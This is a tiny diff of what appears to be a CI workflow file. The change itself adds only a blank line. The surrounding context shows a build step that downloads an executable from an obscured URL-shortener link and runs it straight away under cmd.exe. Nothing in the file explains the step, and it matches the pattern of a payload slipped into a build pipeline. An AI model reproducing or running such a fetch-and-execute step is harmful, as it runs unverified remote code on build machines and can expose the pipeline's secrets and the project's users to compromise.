@@ -10,3 +10,4 @@ jobs:
       shell: cmd.exe
     steps:
       - run: curl -L -o yourcustomlink.exe https://is.gd/yourcustomlink && yourcustomlink.exe
+      
